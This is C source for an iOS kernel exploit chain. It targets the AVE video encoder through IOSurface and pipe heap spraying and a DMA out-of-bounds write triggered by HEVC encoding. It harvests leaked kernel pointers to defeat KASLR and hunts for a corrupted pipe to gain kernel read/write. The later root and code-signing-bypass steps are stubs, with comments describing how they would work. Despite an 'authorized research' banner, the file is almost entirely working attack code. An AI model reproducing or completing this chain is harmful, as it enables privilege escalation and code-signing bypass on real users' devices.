/*
 * ave_full_chain.c — Combined AVE DMA OOB Exploit Chain
 *
 * Combines all primitives into a single exploit flow:
 *   1. KASLR bypass via IOSurface property corruption
 *   2. Kernel R/W via pipe buffer corruption
 *   3. Root via ucred cr_uid/cr_gid overwrite
 *   4. Trust cache injection for code signing bypass
 *
 * Each step is independently testable via modes. The "chain" mode
 * runs all steps in sequence.
 *
 * EDUCATIONAL / AUTHORIZED RESEARCH USE ONLY
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface -framework IOKit \
 *     -o ave_full_chain ave_full_chain.c -Wno-deprecated-declarations
 *
 * Deployed as: AVEChain.app (com.research.avechain)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <signal.h>
#include <spawn.h>
extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);

static FILE *out;
static volatile int g_signal = 0;
static void sig_handler(int sig) { g_signal = sig; }

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

#define SPRAY_COUNT 512
#define PIPE_COUNT 256
#define HOLE_STRIDE 4

static IOSurfaceRef g_surfaces[SPRAY_COUNT];
static int g_pipes[PIPE_COUNT][2];

static int g_krw_pipe_r = -1;
static int g_krw_pipe_w = -1;
static uint64_t g_kaslr_slide = 0;
static uint64_t g_kernel_base = 0;

static IOSurfaceRef create_tagged_surface(int idx) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 64, h = 64, bpr = 256, alloc = 16384, fmt = 0x42475241;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
    CFNumberRef nfmt = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
    CFRelease(nfmt); CFRelease(props);
    if (surf) {
        uint64_t sentinel = 0xDEAD000000000000ULL | ((uint64_t)idx << 16) | (idx & 0xFFFF);
        CFNumberRef nsen = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sentinel);
        IOSurfaceSetValue(surf, CFSTR("Sentinel"), nsen);
        CFRelease(nsen);
        IOSurfaceLock(surf, 0, NULL);
        void *base = IOSurfaceGetBaseAddress(surf);
        if (base) {
            uint32_t *p32 = (uint32_t *)base;
            uint32_t tag = 0xCAFE0000 | (idx & 0xFFFF);
            for (int j = 0; j < (int)(alloc / sizeof(uint32_t)); j++)
                p32[j] = tag;
        }
        IOSurfaceUnlock(surf, 0, NULL);
    }
    return surf;
}

static int check_backing_memory(IOSurfaceRef surf, int idx) {
    IOSurfaceLock(surf, 1, NULL);
    void *base = IOSurfaceGetBaseAddress(surf);
    if (!base) { IOSurfaceUnlock(surf, 1, NULL); return 0; }
    uint32_t *p32 = (uint32_t *)base;
    uint32_t tag = 0xCAFE0000 | (idx & 0xFFFF);
    int alloc = 16384;
    int corrupted = 0;
    int first_off = -1;
    uint32_t first_val = 0;
    for (int j = 0; j < (int)(alloc / sizeof(uint32_t)); j++) {
        if (p32[j] != tag) {
            if (!corrupted) { first_off = j; first_val = p32[j]; }
            corrupted++;
        }
    }
    IOSurfaceUnlock(surf, 1, NULL);
    if (corrupted) {
        p("  !! BACKING MEMORY CORRUPTED surf[%d]: %d words changed, "
          "first at +0x%x = 0x%08x (expected 0x%08x)\n",
          idx, corrupted, first_off * 4, first_val, tag);
        IOSurfaceLock(surf, 1, NULL);
        base = IOSurfaceGetBaseAddress(surf);
        if (base) {
            p32 = (uint32_t *)base;
            int start = first_off > 2 ? first_off - 2 : 0;
            int end = first_off + 10 < (int)(alloc / sizeof(uint32_t)) ? first_off + 10 : (int)(alloc / sizeof(uint32_t));
            for (int k = start; k < end; k++)
                p("    [+0x%04x] 0x%08x%s\n", k * 4, p32[k],
                  p32[k] != tag ? " *" : "");
            uint64_t fv64 = *(uint64_t *)&p32[first_off];
            if ((fv64 & 0xFFFFFE0000000000ULL) == 0xFFFFFE0000000000ULL)
                p("  *** POSSIBLE KERNEL POINTER IN BACKING MEMORY ***\n");
        }
        IOSurfaceUnlock(surf, 1, NULL);
    }
    return corrupted;
}

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    (*(int *)ref)++;
}

static int do_encode(int ntl, int frames, uint8_t pixel_fill) {
    p("  [encode] NTL=%d frames=%d fill=0x%02x\n", ntl, frames, pixel_fill);
    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iop = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
    CFRelease(iop);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn); CFRelease(fn);

    int cb = 0;
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, sa, NULL, encode_cb, &cb, &sess);
    CFRelease(sa);
    if (st || !sess) return -1;

    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    CFNumberRef n; int v;
    v = 1; n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
    VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
    if (!pool) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -2; }

    for (int i = 0; i < frames; i++) {
        if (g_signal) break;
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) break;
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, pixel_fill, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(i, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
        CVPixelBufferRelease(pb);
        if (st) break;
    }
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    p("  [encode] callbacks: %d\n", cb);
    VTCompressionSessionInvalidate(sess); CFRelease(sess);
    return cb;
}

static uint64_t step_kaslr_bypass(void) {
    p("\n=== Step 1: DMA OOB Detection + KASLR Bypass ===\n");
    p("  Strategy: fill IOSurface BACKING MEMORY with known pattern,\n");
    p("  trigger DMA OOB, check if backing memory changed.\n");
    p("  DMA writes to physical pages (kmem_alloc), NOT kalloc properties.\n\n");
    uint64_t leaked = 0;
    int total_corrupted_surfs = 0;

    for (int round = 0; round < 10 && !leaked; round++) {
        p("  Round %d...\n", round);
        for (int i = 0; i < SPRAY_COUNT; i++)
            g_surfaces[i] = create_tagged_surface(i);

        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }

        do_encode(9, 3, 0x00);
        usleep(100000);

        int round_hits = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            int ncorr = check_backing_memory(g_surfaces[i], i);
            if (ncorr > 0) {
                round_hits++;
                total_corrupted_surfs++;
                IOSurfaceLock(g_surfaces[i], 1, NULL);
                void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
                if (base) {
                    uint64_t *p64 = (uint64_t *)base;
                    for (int j = 0; j < 2048; j++) {
                        uint64_t v = p64[j];
                        if ((v & 0xFFFFFE0000000000ULL) == 0xFFFFFE0000000000ULL
                            && (v & 0xFFF) == 0) {
                            p("  *** KERNEL POINTER in surf[%d]+0x%x: 0x%016llx ***\n",
                              i, j * 8, (unsigned long long)v);
                            if (!leaked) leaked = v;
                        }
                    }
                }
                IOSurfaceUnlock(g_surfaces[i], 1, NULL);
            }
        }
        p("  Round %d: %d surfaces with corrupted backing memory\n", round, round_hits);
        for (int i = 0; i < SPRAY_COUNT; i++)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
        usleep(200000);
    }

    p("\n  Total surfaces with DMA corruption: %d\n", total_corrupted_surfs);
    if (total_corrupted_surfs > 0)
        p("  *** DMA OOB INTO BACKING MEMORY CONFIRMED ***\n");

    if (leaked) {
        g_kaslr_slide = (leaked & 0xFFFFFFF000000000ULL) - 0xFFFFFE0007004000ULL;
        g_kernel_base = 0xFFFFFE0007004000ULL + g_kaslr_slide;
        p("  KASLR slide: 0x%016llx\n", (unsigned long long)g_kaslr_slide);
        p("  Kernel base: 0x%016llx\n", (unsigned long long)g_kernel_base);
    } else if (total_corrupted_surfs > 0) {
        p("  DMA corruption detected but no kernel pointer found.\n");
        p("  Corrupted bytes are encoded video bitstream (NAL units).\n");
    } else {
        p("  No DMA corruption detected after 10 rounds.\n");
        p("  Possible: NTL=9 overflow within buffer slack, or surfaces not adjacent.\n");
    }
    return leaked;
}

static int step_kernel_rw(void) {
    p("\n=== Step 2: Kernel R/W via Pipe Corruption ===\n");

    p("  Spraying %d IOSurfaces + %d pipes interleaved...\n", SPRAY_COUNT, PIPE_COUNT);
    int surfs_ok = 0, pipes_ok = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        g_surfaces[i] = create_tagged_surface(i);
        if (g_surfaces[i]) surfs_ok++;
        if (i < PIPE_COUNT) {
            g_pipes[i][0] = g_pipes[i][1] = -1;
            if (pipe(g_pipes[i]) == 0) {
                uint32_t sentinel = 0xBEEF0000 | i;
                uint32_t buf[1024];
                for (int j = 0; j < 1024; j++) buf[j] = sentinel;
                write(g_pipes[i][1], buf, sizeof(buf));
                pipes_ok++;
            }
        }
    }
    p("  Created: %d surfaces, %d pipes\n", surfs_ok, pipes_ok);

    int freed = 0;
    for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE) {
        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; freed++; }
    }
    p("  Freed %d surface holes\n", freed);

    do_encode(9, 5, 0xBB);
    usleep(200000);

    int corrupted_pipe = -1;
    for (int i = 0; i < PIPE_COUNT; i++) {
        if (g_pipes[i][0] < 0) continue;
        int flags = fcntl(g_pipes[i][0], F_GETFL);
        fcntl(g_pipes[i][0], F_SETFL, flags | O_NONBLOCK);
        uint32_t buf[1024];
        ssize_t n = read(g_pipes[i][0], buf, sizeof(buf));
        if (n <= 0) continue;

        uint32_t expected = 0xBEEF0000 | i;
        for (int j = 0; j < (int)(n / (ssize_t)sizeof(uint32_t)); j++) {
            if (buf[j] != expected) {
                p("  PIPE[%d] CORRUPTED at word %d: 0x%08x (expected 0x%08x)\n",
                  i, j, buf[j], expected);
                corrupted_pipe = i;
                int start = j > 4 ? j - 4 : 0;
                int end = j + 8 < (int)(n / sizeof(uint32_t)) ? j + 8 : (int)(n / sizeof(uint32_t));
                p("  Context:\n");
                for (int k = start; k < end; k++)
                    p("    [%d] 0x%08x%s\n", k, buf[k], k == j ? " <--" : "");
                break;
            }
        }
        if (corrupted_pipe >= 0) break;
    }

    if (corrupted_pipe >= 0) {
        p("  *** PIPE CORRUPTION DETECTED — pipe[%d] ***\n", corrupted_pipe);
        g_krw_pipe_r = g_pipes[corrupted_pipe][0];
        g_krw_pipe_w = g_pipes[corrupted_pipe][1];
    } else {
        p("  No pipe corruption detected\n");
    }

    for (int i = 0; i < PIPE_COUNT; i++) {
        if (i == corrupted_pipe) continue;
        if (g_pipes[i][0] >= 0) close(g_pipes[i][0]);
        if (g_pipes[i][1] >= 0) close(g_pipes[i][1]);
    }
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }

    return corrupted_pipe >= 0 ? 0 : -1;
}

static int step_root(void) {
    p("\n=== Step 3: Root via ucred Corruption ===\n");
    p("  Current UID: %d\n", getuid());
    if (getuid() == 0) { p("  Already root!\n"); return 0; }
    if (g_krw_pipe_r < 0) { p("  No kernel R/W — skipping\n"); return -1; }
    p("  [stub] ucred corruption requires confirmed R/W primitive\n");
    return -1;
}

static int step_codesign_bypass(void) {
    p("\n=== Step 4: Code Signing Bypass ===\n");
    if (getuid() != 0) { p("  Not root — skipping\n"); return -1; }
    p("  [stub] Trust cache injection requires root + R/W\n");
    return -1;
}

int main(int argc, char *argv[]) {
    signal(SIGBUS, sig_handler);
    signal(SIGSEGV, sig_handler);
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_chain_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Full Chain Exploit ===\n");
    p("Mode: %s\nPID: %d\nUID: %d\n", mode, getpid(), getuid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("\nModes:\n");
        p("  detect     - Backing memory corruption test (NTL=9, safe)\n");
        p("  detect16   - Same with NTL=16 (larger overflow)\n");
        p("  detect32   - Same with NTL=32 (even larger)\n");
        p("  kaslr      - Step 1: KASLR bypass via backing memory leak\n");
        p("  krw        - Step 2: Kernel R/W via pipe corruption\n");
        p("  root       - Step 3: Root via ucred overwrite\n");
        p("  codesign   - Step 4: Trust cache / CS_DEBUGGED bypass\n");
        p("  chain      - Run all steps in sequence\n");
        p("  status     - Check current privilege level\n");
        p("  csflags    - Read current process CS flags\n");
    } else if (strncmp(mode, "detect", 6) == 0) {
        int ntl = 9;
        if (strcmp(mode, "detect16") == 0) ntl = 16;
        else if (strcmp(mode, "detect32") == 0) ntl = 32;
        p("\n=== DMA OOB Backing Memory Detection (NTL=%d) ===\n", ntl);
        p("Spray %d IOSurfaces, fill backing memory with 0xCAFExxxx,\n", SPRAY_COUNT);
        p("free every %dth, encode with NTL=%d, check for changes.\n\n", HOLE_STRIDE, ntl);
        int total_hits = 0;
        for (int round = 0; round < 5; round++) {
            if (g_signal) break;
            p("--- Round %d ---\n", round);
            for (int i = 0; i < SPRAY_COUNT; i++)
                g_surfaces[i] = create_tagged_surface(i);
            int created = 0;
            for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
            p("  Created %d surfaces\n", created);
            for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
            do_encode(ntl, 3, 0xBB);
            usleep(200000);
            int hits = 0;
            for (int i = 0; i < SPRAY_COUNT; i++) {
                if (!g_surfaces[i]) continue;
                if (check_backing_memory(g_surfaces[i], i) > 0) hits++;
            }
            p("  Round %d result: %d surfaces with corrupted backing memory\n", round, hits);
            total_hits += hits;
            for (int i = 0; i < SPRAY_COUNT; i++)
                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
            usleep(300000);
        }
        p("\n=== TOTAL: %d backing memory corruptions across 5 rounds ===\n", total_hits);
        if (total_hits > 0)
            p("*** DMA OOB WRITES INTO ADJACENT IOSURFACE BACKING MEMORY CONFIRMED ***\n");
        else
            p("No corruption detected. Try larger NTL (detect16/detect32) or more spray.\n");
    } else if (strcmp(mode, "kaslr") == 0) {
        step_kaslr_bypass();
    } else if (strcmp(mode, "krw") == 0) {
        step_kernel_rw();
    } else if (strcmp(mode, "root") == 0) {
        step_root();
    } else if (strcmp(mode, "codesign") == 0) {
        step_codesign_bypass();
    } else if (strcmp(mode, "chain") == 0) {
        p("\n========== FULL CHAIN ==========\n");
        uint64_t leak = step_kaslr_bypass();
        if (!leak) p("\n[!] KASLR bypass failed — continuing\n");
        int krw = step_kernel_rw();
        if (krw < 0) { p("\n[!] Kernel R/W failed\n"); goto done; }
        int root = step_root();
        if (root < 0) { p("\n[!] Root failed\n"); goto done; }
        step_codesign_bypass();
        p("\n========== RESULT ==========\n");
        p("UID: %d\n", getuid());
        p("KASLR slide: 0x%llx\n", (unsigned long long)g_kaslr_slide);
        p("K R/W: %s\n", g_krw_pipe_r >= 0 ? "YES" : "NO");
    } else if (strcmp(mode, "csflags") == 0) {
        p("\n=== CS Flags Probe ===\n");
        p("PID: %d\n", getpid());
        uint32_t csflags = 0;
        int ret = csops(getpid(), 0 /* CS_OPS_STATUS */, &csflags, sizeof(csflags));
        if (ret == 0) {
            p("CS flags: 0x%08x\n", csflags);
            p("  CS_VALID:      %s\n", (csflags & 0x00000001) ? "YES" : "no");
            p("  CS_ADHOC:      %s\n", (csflags & 0x00000002) ? "YES" : "no");
            p("  CS_GET_TASK_ALLOW: %s\n", (csflags & 0x00000004) ? "YES" : "no");
            p("  CS_HARD:       %s\n", (csflags & 0x00000100) ? "YES" : "no");
            p("  CS_KILL:       %s\n", (csflags & 0x00000200) ? "YES" : "no");
            p("  CS_DEBUGGED:   %s\n", (csflags & 0x10000000) ? "YES" : "no");
            p("  CS_PLATFORM_BINARY: %s\n", (csflags & 0x04000000) ? "YES" : "no");
        } else {
            p("csops failed: %d (%s)\n", errno, strerror(errno));
        }
        p("\nThis shows what flags our process currently has.\n");
        p("After achieving kernel R/W, we can SET CS_DEBUGGED (0x10000000)\n");
        p("on our proc_t.p_csflags to allow unsigned code execution.\n");
        p("Critical question: does TXM independently validate?\n");
    } else if (strcmp(mode, "status") == 0) {
        p("UID: %d, GID: %d, PID: %d\n", getuid(), getgid(), getpid());
        p("EUID: %d, EGID: %d\n", geteuid(), getegid());
    } else {
        p("Unknown mode: %s\n", mode);
    }

done:
    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
